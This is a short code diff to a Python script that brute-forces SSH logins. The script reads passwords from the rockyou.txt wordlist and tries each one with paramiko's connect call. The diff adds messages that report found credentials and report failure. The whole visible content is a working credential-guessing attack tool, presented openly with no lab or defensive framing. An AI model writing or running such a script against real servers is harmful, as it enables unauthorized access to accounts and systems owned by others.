@@ -22,9 +22,11 @@ if os.path.exists('rockyou.txt'):
             #login ssh
             try:               
                 ssh.connect(host, username=uname, password=word, look_for_keys=False )
+                print("Correct Credentials Found! Username:" , uname , "Password:", word)
             except Exception as error_message:
-                print("Username:", uname, " Password:", word, "Incorrect!")
+                print("Username:", uname, "Password:", word, "Incorrect!")
         fp.close()
+    print("Unfortunately Username:" , uname , "Couldn't be brute forced either wrong user name or password not in wordlist")
 else:
     print("try again when you actually have the rockyou.txt wordlist in same directory as this script!")   
 
